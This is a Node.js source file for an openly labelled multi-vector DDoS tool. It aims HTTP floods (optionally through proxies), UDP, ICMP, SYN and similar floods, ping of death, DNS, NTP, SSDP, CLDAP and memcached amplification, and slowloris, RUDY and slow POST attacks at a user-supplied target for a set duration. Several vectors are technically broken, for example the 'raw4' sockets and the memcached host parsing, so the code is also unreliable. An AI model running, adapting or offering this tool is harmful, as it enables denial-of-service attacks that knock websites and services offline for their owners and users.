const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const dns = require('dns');
const url = require('url');
const crypto = require('crypto');
const { promisify } = require('util');

const dnsLookup = promisify(dns.lookup);
const MAX_SOCKETS = 100000;
const TARGET_URL = process.argv[2];
const DURATION = parseInt(process.argv[3]) || 300;
const THREADS = parseInt(process.argv[4]) || os.cpus().length * 10;
const PROXY_FILE = process.argv[5];

let targetHost, targetPort, targetIP, useSSL, targetPath;
let proxies = [];
let running = true;
let requestsSent = 0;
let successfulRequests = 0;
let failedRequests = 0;
let peakRps = 0;
let startTime;

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
];

const paths = [
    '/', '/index.html', '/index.php', '/home', '/main', '/default', '/about', '/contact', 
    '/login', '/register', '/dashboard', '/profile', '/settings', '/help', '/support', 
    '/faq', '/news', '/blog', '/products', '/services', '/gallery', '/portfolio', 
    '/team', '/careers', '/partners', '/testimonials', '/reviews', '/events', 
    '/downloads', '/uploads', '/search', '/cart', '/checkout', '/wishlist', 
    '/order', '/history', '/tracking', '/returns', '/shipping', '/payment', 
    '/invoice', '/receipt', '/confirmation', '/thankyou', '/welcome', '/intro', 
    '/guide', '/tutorial', '/manual', '/documentation', '/api', '/docs', 
    '/terms', '/privacy', 'legal', '/disclaimer', '/cookies', '/sitemap', 
    '/rss', '/atom', '/feed', '/newsletter', '/subscribe', '/unsubscribe', 
    '/feedback', '/survey', '/poll', '/quiz', '/contest', '/promotion', 
    '/discount', '/coupon', '/offer', '/deal', '/sale', '/clearance', 
    '/new', '/featured', '/popular', '/trending', '/recommended', '/bestseller', 
    '/category', '/collection', '/brand', '/vendor', '/supplier', '/manufacturer',
    '/store', '/shop', '/market', '/mall', '/outlet', '/boutique', '/showroom'
];

const dnsServers = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9',
    '208.67.222.222', '208.67.220.220', '64.6.64.6', '64.6.65.6'
];

const ntpServers = [
    '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org',
    'cn.pool.ntp.org', 'europe.pool.ntp.org', 'asia.pool.ntp.org', 'oceania.pool.ntp.org'
];

const memcachedServers = [
    'memcached://11211', 'memcached://11212', 'memcached://11213'
];

const ssdpTargets = [
    '239.255.255.250:1900'
];

const cldapTargets = [
    '389'
];

function parseUrl(urlStr) {
    const parsedUrl = new URL(urlStr);
    targetHost = parsedUrl.hostname;
    targetPort = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
    useSSL = parsedUrl.protocol === 'https:';
    targetPath = parsedUrl.pathname || '/';
    
    dnsLookup(targetHost).then(({ address }) => {
        targetIP = address;
    }).catch(() => {
        targetIP = targetHost;
    });
}

function loadProxies(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const lines = data.split('\n');
        
        for (const line of lines) {
            const [ip, port] = line.trim().split(':');
            if (ip && port) {
                proxies.push({ ip, port: parseInt(port) });
            }
        }
        
        console.log(`[*] Loaded ${proxies.length} proxies`);
    } catch (err) {
        console.log(`[*] Failed to load proxy file: ${err.message}`);
    }
}

function statsCollector() {
    const interval = setInterval(() => {
        if (!running) {
            clearInterval(interval);
            return;
        }
        
        const elapsed = (Date.now() - startTime) / 1000;
        const currentRps = requestsSent / elapsed;
        
        if (currentRps > peakRps) {
            peakRps = currentRps;
        }
        
        process.stdout.write(`\r[*] Requests: ${requestsSent} | RPS: ${currentRps.toFixed(2)} | Peak RPS: ${peakRps.toFixed(2)} | Success: ${successfulRequests} | Failed: ${failedRequests}`);
    }, 1000);
}

async function sendRequest() {
    const path = paths[Math.floor(Math.random() * paths.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    const options = {
        hostname: targetHost,
        port: targetPort,
        path: path,
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Connection': 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        },
        timeout: 5000
    };
    
    return new Promise((resolve) => {
        let req;
        
        const handleResponse = (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                requestsSent++;
                
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
                
                resolve();
            });
        };
        
        const handleError = (err) => {
            failedRequests++;
            requestsSent++;
            resolve();
        };
        
        if (useSSL) {
            req = https.request(options, handleResponse);
        } else {
            req = http.request(options, handleResponse);
        }
        
        req.on('error', handleError);
        req.on('timeout', () => {
            req.destroy();
            handleError(new Error('Request timeout'));
        });
        
        req.end();
    });
}

async function sendRequestThroughProxy(proxy) {
    const path = paths[Math.floor(Math.random() * paths.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    return new Promise((resolve) => {
        const socket = new net.Socket();
        let connected = false;
        
        socket.setTimeout(5000);
        
        socket.on('connect', () => {
            connected = true;
            
            if (useSSL) {
                const connectRequest = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n\r\n`;
                
                socket.write(connectRequest);
                
                let responseBuffer = '';
                
                socket.on('data', (data) => {
                    responseBuffer += data.toString();
                    
                    if (responseBuffer.includes('\r\n\r\n')) {
                        if (responseBuffer.includes('200 Connection established')) {
                            const tlsSocket = tls.connect({
                                host: targetHost,
                                port: targetPort,
                                socket: socket,
                                servername: targetHost,
                                rejectUnauthorized: false
                            }, () => {
                                const request = `GET ${path} HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
                                
                                tlsSocket.write(request);
                                
                                let responseBuffer = '';
                                
                                tlsSocket.on('data', (data) => {
                                    responseBuffer += data.toString();
                                });
                                
                                tlsSocket.on('end', () => {
                                    requestsSent++;
                                    
                                    if (responseBuffer.includes('HTTP/') && responseBuffer.includes('200')) {
                                        successfulRequests++;
                                    } else {
                                        failedRequests++;
                                    }
                                    
                                    tlsSocket.destroy();
                                    resolve();
                                });
                            });
                            
                            tlsSocket.on('error', () => {
                                failedRequests++;
                                requestsSent++;
                                socket.destroy();
                                resolve();
                            });
                        } else {
                            failedRequests++;
                            requestsSent++;
                            socket.destroy();
                            resolve();
                        }
                    }
                });
            } else {
                const request = `GET ${path} HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
                
                socket.write(request);
                
                let responseBuffer = '';
                
                socket.on('data', (data) => {
                    responseBuffer += data.toString();
                });
                
                socket.on('end', () => {
                    requestsSent++;
                    
                    if (responseBuffer.includes('HTTP/') && responseBuffer.includes('200')) {
                        successfulRequests++;
                    } else {
                        failedRequests++;
                    }
                    
                    socket.destroy();
                    resolve();
                });
            }
        });
        
        socket.on('timeout', () => {
            if (!connected) {
                failedRequests++;
                requestsSent++;
                socket.destroy();
                resolve();
            }
        });
        
        socket.on('error', () => {
            if (!connected) {
                failedRequests++;
                requestsSent++;
                socket.destroy();
                resolve();
            }
        });
        
        socket.connect(proxy.port, proxy.ip);
    });
}

async function udpFlood() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const message = crypto.randomBytes(1024);
            socket.send(message, 0, message.length, targetPort, targetIP, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function icmpFlood() {
    const socket = dgram.createSocket('raw4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(64);
            packet[0] = 8;
            packet[1] = 0;
            packet[2] = 0;
            packet[3] = 0;
            packet[4] = 0;
            packet[5] = 1;
            packet[6] = 0;
            packet[7] = 1;
            
            socket.send(packet, 0, packet.length, targetPort, targetIP, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function pingOfDeath() {
    const socket = dgram.createSocket('raw4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(65535);
            packet[0] = 8;
            packet[1] = 0;
            packet[2] = 0;
            packet[3] = 0;
            packet[4] = 0;
            packet[5] = 1;
            packet[6] = 0;
            packet[7] = 1;
            
            socket.send(packet, 0, packet.length, targetPort, targetIP, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function smurfAttack() {
    const socket = dgram.createSocket('raw4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(64);
            packet[0] = 8;
            packet[1] = 0;
            packet[2] = 0;
            packet[3] = 0;
            packet[4] = 0;
            packet[5] = 1;
            packet[6] = 0;
            packet[7] = 1;
            
            socket.send(packet, 0, packet.length, targetPort, '255.255.255.255', (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function synFlood() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(1000);
            
            socket.on('connect', () => {
                requestsSent++;
                successfulRequests++;
                socket.destroy();
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function ackFlood() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(1000);
            
            socket.on('connect', () => {
                const ackPacket = Buffer.from([
                    0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x20, 0x00,
                    0x00, 0x00, 0x00, 0x00
                ]);
                
                socket.write(ackPacket);
                requestsSent++;
                successfulRequests++;
                socket.destroy();
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function rstFlood() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(1000);
            
            socket.on('connect', () => {
                const rstPacket = Buffer.from([
                    0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x50, 0x04, 0x20, 0x00,
                    0x00, 0x00, 0x00, 0x00
                ]);
                
                socket.write(rstPacket);
                requestsSent++;
                successfulRequests++;
                socket.destroy();
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function finFlood() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(1000);
            
            socket.on('connect', () => {
                const finPacket = Buffer.from([
                    0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x50, 0x01, 0x20, 0x00,
                    0x00, 0x00, 0x00, 0x00
                ]);
                
                socket.write(finPacket);
                requestsSent++;
                successfulRequests++;
                socket.destroy();
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function fragmentationAttack() {
    const socket = dgram.createSocket('raw4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(1500);
            
            for (let i = 0; i < 10; i++) {
                const offset = i * 150;
                const fragPacket = Buffer.alloc(1500);
                
                fragPacket[0] = 0x45;
                fragPacket[1] = 0x00;
                fragPacket[2] = 0x05;
                fragPacket[3] = 0xdc;
                fragPacket[4] = 0x12;
                fragPacket[5] = 0x34;
                fragPacket[6] = 0x40;
                fragPacket[7] = 0x00;
                fragPacket[8] = 0x40;
                fragPacket[9] = 0x01;
                
                const ipParts = targetIP.split('.');
                fragPacket[12] = parseInt(ipParts[0]);
                fragPacket[13] = parseInt(ipParts[1]);
                fragPacket[14] = parseInt(ipParts[2]);
                fragPacket[15] = parseInt(ipParts[3]);
                
                fragPacket[20] = offset >> 8;
                fragPacket[21] = offset & 0xff;
                fragPacket[22] = 0x00;
                fragPacket[23] = 0x00;
                
                socket.send(fragPacket, 0, fragPacket.length, targetPort, targetIP, (err) => {
                    if (!err) {
                        requestsSent++;
                        successfulRequests++;
                    } else {
                        failedRequests++;
                    }
                });
            }
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function dnsFlood() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(64);
            packet[0] = Math.floor(Math.random() * 256);
            packet[1] = Math.floor(Math.random() * 256);
            packet[2] = 0x01;
            packet[3] = 0x00;
            packet[4] = 0x00;
            packet[5] = 0x01;
            packet[6] = 0x00;
            packet[7] = 0x00;
            packet[8] = 0x00;
            packet[9] = 0x00;
            packet[10] = 0x00;
            packet[11] = 0x00;
            
            const domain = targetHost;
            let pos = 12;
            const parts = domain.split('.');
            
            for (const part of parts) {
                packet[pos++] = part.length;
                for (let i = 0; i < part.length; i++) {
                    packet[pos++] = part.charCodeAt(i);
                }
            }
            
            packet[pos++] = 0x00;
            packet[pos++] = 0x00;
            packet[pos++] = 0x01;
            packet[pos++] = 0x00;
            packet[pos++] = 0x01;
            
            const dnsServer = dnsServers[Math.floor(Math.random() * dnsServers.length)];
            socket.send(packet, 0, pos, 53, dnsServer, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function dnsAmplification() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(64);
            packet[0] = Math.floor(Math.random() * 256);
            packet[1] = Math.floor(Math.random() * 256);
            packet[2] = 0x01;
            packet[3] = 0x00;
            packet[4] = 0x00;
            packet[5] = 0x01;
            packet[6] = 0x00;
            packet[7] = 0x00;
            packet[8] = 0x00;
            packet[9] = 0x00;
            packet[10] = 0x00;
            packet[11] = 0x00;
            
            const domain = 'google.com';
            let pos = 12;
            const parts = domain.split('.');
            
            for (const part of parts) {
                packet[pos++] = part.length;
                for (let i = 0; i < part.length; i++) {
                    packet[pos++] = part.charCodeAt(i);
                }
            }
            
            packet[pos++] = 0x00;
            packet[pos++] = 0x00;
            packet[pos++] = 0xff;
            packet[pos++] = 0x00;
            packet[pos++] = 0x01;
            
            const dnsServer = dnsServers[Math.floor(Math.random() * dnsServers.length)];
            socket.send(packet, 0, pos, 53, dnsServer, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function ntpAmplification() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(48);
            packet[0] = 0x1b;
            
            const ntpServer = ntpServers[Math.floor(Math.random() * ntpServers.length)];
            
            dnsLookup(ntpServer).then(({ address }) => {
                socket.send(packet, 0, packet.length, 123, address, (err) => {
                    if (!err) {
                        requestsSent++;
                        successfulRequests++;
                    } else {
                        failedRequests++;
                    }
                });
            }).catch(() => {
                failedRequests++;
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function ssdpAmplification() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const message = Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n');
            
            const target = ssdpTargets[Math.floor(Math.random() * ssdpTargets.length)];
            const [host, port] = target.split(':');
            
            socket.send(message, 0, message.length, parseInt(port), host, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function cldapAmplification() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const packet = Buffer.alloc(64);
            packet[0] = 0x30;
            packet[1] = 0x25;
            packet[2] = 0x02;
            packet[3] = 0x01;
            packet[4] = 0x63;
            packet[5] = 0x0a;
            packet[6] = 0x04;
            packet[7] = 0x00;
            
            const port = cldapTargets[Math.floor(Math.random() * cldapTargets.length)];
            
            socket.send(packet, 0, packet.length, parseInt(port), targetIP, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function memcachedAmplification() {
    const socket = dgram.createSocket('udp4');
    
    while (running) {
        try {
            const message = Buffer.from('\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n');
            
            const target = memcachedServers[Math.floor(Math.random() * memcachedServers.length)];
            const [host, port] = target.split('://')[1].split(':');
            
            socket.send(message, 0, message.length, parseInt(port), host, (err) => {
                if (!err) {
                    requestsSent++;
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
            });
        } catch (err) {
            failedRequests++;
        }
    }
    
    socket.close();
}

async function slowloris() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(10000);
            
            socket.on('connect', () => {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const request = `GET / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n`;
                
                socket.write(request);
                
                const interval = setInterval(() => {
                    if (!running) {
                        clearInterval(interval);
                        socket.destroy();
                        return;
                    }
                    
                    socket.write(`X-a: ${Math.random().toString(36).substring(2)}\r\n`);
                }, 5000);
                
                requestsSent++;
                successfulRequests++;
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function rudyAttack() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(10000);
            
            socket.on('connect', () => {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const request = `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\n\r\n`;
                
                socket.write(request);
                
                let sent = 0;
                const chunkSize = 10;
                
                const interval = setInterval(() => {
                    if (!running || sent >= 1000000) {
                        clearInterval(interval);
                        socket.destroy();
                        return;
                    }
                    
                    const chunk = 'a'.repeat(chunkSize);
                    socket.write(chunk);
                    sent += chunkSize;
                }, 1000);
                
                requestsSent++;
                successfulRequests++;
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function slowPost() {
    while (running) {
        try {
            const socket = new net.Socket();
            
            socket.setTimeout(10000);
            
            socket.on('connect', () => {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const request = `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\n\r\n`;
                
                socket.write(request);
                
                let sent = 0;
                const chunkSize = 1;
                
                const interval = setInterval(() => {
                    if (!running || sent >= 1000000) {
                        clearInterval(interval);
                        socket.destroy();
                        return;
                    }
                    
                    const chunk = 'a';
                    socket.write(chunk);
                    sent += chunkSize;
                }, 5000);
                
                requestsSent++;
                successfulRequests++;
            });
            
            socket.on('timeout', () => {
                failedRequests++;
                requestsSent++;
                socket.destroy();
            });
            
            socket.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            socket.connect(targetPort, targetIP);
        } catch (err) {
            failedRequests++;
        }
    }
}

async function rangeHeaderAttack() {
    const path = paths[Math.floor(Math.random() * paths.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    const options = {
        hostname: targetHost,
        port: targetPort,
        path: path,
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Connection': 'close',
            'Range': `bytes=0-${Math.floor(Math.random() * 1000000)}`
        },
        timeout: 5000
    };
    
    return new Promise((resolve) => {
        let req;
        
        const handleResponse = (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                requestsSent++;
                
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    successfulRequests++;
                } else {
                    failedRequests++;
                }
                
                resolve();
            });
        };
        
        const handleError = (err) => {
            failedRequests++;
            requestsSent++;
            resolve();
        };
        
        if (useSSL) {
            req = https.request(options, handleResponse);
        } else {
            req = http.request(options, handleResponse);
        }
        
        req.on('error', handleError);
        req.on('timeout', () => {
            req.destroy();
            handleError(new Error('Request timeout'));
        });
        
        req.end();
    });
}

async function websocketFlood() {
    const WebSocket = require('ws');
    
    while (running) {
        try {
            const wsUrl = `${useSSL ? 'wss' : 'ws'}://${targetHost}:${targetPort}${targetPath}`;
            const ws = new WebSocket(wsUrl, {
                headers: {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)]
                }
            });
            
            ws.on('open', () => {
                requestsSent++;
                successfulRequests++;
                
                const interval = setInterval(() => {
                    if (!running) {
                        clearInterval(interval);
                        ws.close();
                        return;
                    }
                    
                    ws.send(Math.random().toString(36).substring(2));
                }, 1000);
            });
            
            ws.on('error', () => {
                failedRequests++;
                requestsSent++;
            });
            
            ws.on('close', () => {
                failedRequests++;
                requestsSent++;
            });
        } catch (err) {
            failedRequests++;
        }
    }
}

async function multiVectorAttack() {
    const attacks = [
        udpFlood, icmpFlood, synFlood, ackFlood, rstFlood, finFlood,
        dnsFlood, dnsAmplification, ntpAmplification, ssdpAmplification,
        cldapAmplification, memcachedAmplification, slowloris, rudyAttack,
        slowPost, rangeHeaderAttack, websocketFlood, sendRequest
    ];
    
    const promises = [];
    
    while (running) {
        try {
            const attack = attacks[Math.floor(Math.random() * attacks.length)];
            promises.push(attack());
            
            if (promises.length >= 10) {
                await Promise.all(promises);
                promises.length = 0;
            }
        } catch (err) {
            failedRequests++;
        }
    }
    
    if (promises.length > 0) {
        await Promise.all(promises);
    }
}

async function flood() {
    const promises = [];
    
    while (running) {
        try {
            if (proxies.length > 0 && Math.random() > 0.5) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                promises.push(sendRequestThroughProxy(proxy));
            } else {
                promises.push(sendRequest());
            }
            
            if (promises.length >= 100) {
                await Promise.all(promises);
                promises.length = 0;
            }
        } catch (err) {
            failedRequests++;
            requestsSent++;
        }
    }
    
    if (promises.length > 0) {
        await Promise.all(promises);
    }
}

async function run() {
    parseUrl(TARGET_URL);
    
    if (PROXY_FILE) {
        loadProxies(PROXY_FILE);
    }
    
    console.log(`[*] Starting DDoS attack on ${TARGET_URL}`);
    console.log(`[*] Target: ${targetHost}:${targetPort} (${useSSL ? 'HTTPS' : 'HTTP'})`);
    console.log(`[*] Duration: ${DURATION} seconds`);
    console.log(`[*] Threads: ${THREADS}`);
    console.log(`[*] Proxies: ${proxies.length}`);
    
    startTime = Date.now();
    statsCollector();
    
    const workers = [];
    
    for (let i = 0; i < THREADS; i++) {
        workers.push(multiVectorAttack());
    }
    
    await Promise.all(workers);
    
    const elapsed = (Date.now() - startTime) / 1000;
    const avgRps = requestsSent / elapsed;
    
    console.log(`\n[*] Attack completed`);
    console.log(`[*] Total requests: ${requestsSent}`);
    console.log(`[*] Successful requests: ${successfulRequests}`);
    console.log(`[*] Failed requests: ${failedRequests}`);
    console.log(`[*] Average RPS: ${avgRps.toFixed(2)}`);
    console.log(`[*] Peak RPS: ${peakRps.toFixed(2)}`);
    
    process.exit(0);
}

if (cluster.isMaster) {
    const numWorkers = os.cpus().length;
    
    for (let i = 0; i < numWorkers; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
    setTimeout(() => {
        running = false;
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }, DURATION * 1000);
} else {
    run().catch(err => {
        console.error(err);
        process.exit(1);
    });
}
